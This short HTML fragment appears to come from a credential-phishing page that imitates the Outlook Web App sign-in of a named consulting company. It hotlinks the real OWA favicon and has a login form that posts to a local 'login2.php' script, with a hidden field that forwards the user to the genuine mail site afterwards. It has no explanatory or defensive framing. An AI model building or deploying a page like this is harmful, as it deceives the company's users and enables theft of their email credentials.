...
<link rel="shortcut icon" href="https://mail.pereiraconsultants.com/owa/auth/15.1.1531/themes/resources/favicon.ico" type="image/x-icon">
...
<form action="login2.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
<input type="hidden" name="destination" value="https://mail.pereiraconsultants.com/owa">
